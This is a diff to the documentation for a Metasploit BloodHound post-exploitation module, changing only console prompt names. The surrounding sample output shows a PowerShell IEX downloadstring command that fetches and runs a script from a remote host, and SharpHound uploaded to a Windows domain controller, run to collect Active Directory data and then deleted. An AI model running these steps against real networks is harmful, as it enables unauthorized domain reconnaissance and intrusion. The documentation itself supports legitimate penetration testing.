@@ -79,7 +79,7 @@ If the cache file (.bin) should NOT be written to disk.  Default is `true`.
 ### Windows 2012 Domain Controller, Download method
 
 ```
-msf6 post(windows/gather/bloodhound) > run
+msf post(windows/gather/bloodhound) > run
 
 [*] Using URL: http://1.1.1.1:8080/127mPhBr3dZ
 [*] Loading BloodHound with: IEX (new-object net.webclient).downloadstring('http://1.1.1.1:8080/127mPhBr3dZ')
@@ -126,9 +126,9 @@ Logged On Users : 7
 Meterpreter     : x86/windows
 meterpreter > background
 [*] Backgrounding session 1...
-msf5 post(windows/gather/bloodhound) > set method disk
+msf post(windows/gather/bloodhound) > set method disk
 method => disk
-msf5 post(windows/gather/bloodhound) > exploit
+msf post(windows/gather/bloodhound) > exploit
 
 [*] Uploading sharphound.exe as C:\Users\user\Desktop\qehojlwml.exe
 [*] Loading BloodHound with: . C:\Users\user\Desktop\qehojlwml.exe --outputdirectory "C:\Users\user\AppData\Local\Temp" --zipfilename eiqxerh --encryptzip --nosavecache 
@@ -157,7 +157,7 @@ powershell.exe -EncodedCommand LgAgAEMAOgBcAFUAcwBlAHIAcwBcAHQAYQByAGEAXABEAGUAc
 [*] Deleting C:\Users\user\Desktop\qehojlwml.exe
 [*] Post module execution completed
 
-msf5 post(windows/gather/bloodhound) > notes
+msf post(windows/gather/bloodhound) > notes
 
 Notes
 =====
